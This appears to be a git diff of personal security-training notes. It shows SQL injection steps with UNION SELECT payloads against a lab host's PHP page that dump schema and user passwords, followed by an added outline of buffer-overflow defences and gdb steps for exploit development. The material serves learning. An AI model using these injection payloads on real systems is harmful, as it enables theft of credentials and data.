@@ -233,10 +233,23 @@ identify number of columns (UNION SELECT 1,2,3(start with the same number of vis
 modify golden statement (http://10.50.33.78/uniondemo.php?Selection=3 (UNION SELECT table_schema,column_name,table_name%20from%20information_schema.columns))
 craft query(http://10.50.33.78/uniondemo.php?Selection=3 (UNION SELECT id,pass,name from session.user))
 
+#  Exploit Development
 
-
-
-
+#   Buffer Overflow Defenses
+    Non executable (NX) stack
+    Address Space Layout Randomization (ASLR)
+    Data Execution Prevention (DEP)
+    Stack Canaries
+    Position Independent Executable (PIE)
+#   Steps
+run file <program>
+run strngs <program>
+run gdb <program> (if failed review file perms)
+run disass main
+run disass on following functions (pdisass will how vulnerable commands)
+to run a file with program in gdb (run <<< $(<scriptingLanguage> <file name>))
+(environment variable gdb)env - gdb func
+disable all env variables
 
 
 
